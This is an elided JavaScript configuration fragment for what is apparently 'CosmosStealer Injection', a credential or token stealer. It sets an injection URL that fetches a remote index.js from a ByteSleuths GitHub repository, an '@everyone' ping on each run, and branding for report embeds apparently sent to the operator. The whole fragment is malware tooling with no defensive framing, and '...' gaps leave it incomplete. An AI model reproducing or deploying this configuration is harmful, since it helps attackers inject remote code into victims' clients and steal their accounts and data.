...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'CosmosStealer Injection', 
  embed_icon: 'https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/ByteSleuths/Injection/refs/heads/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
            text: 'CosmosStealer Injection・https://github.com/ByteSleuths/Cosmos-Sentry',
            icon_url: "https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png"
        },
      },
    ],
  };
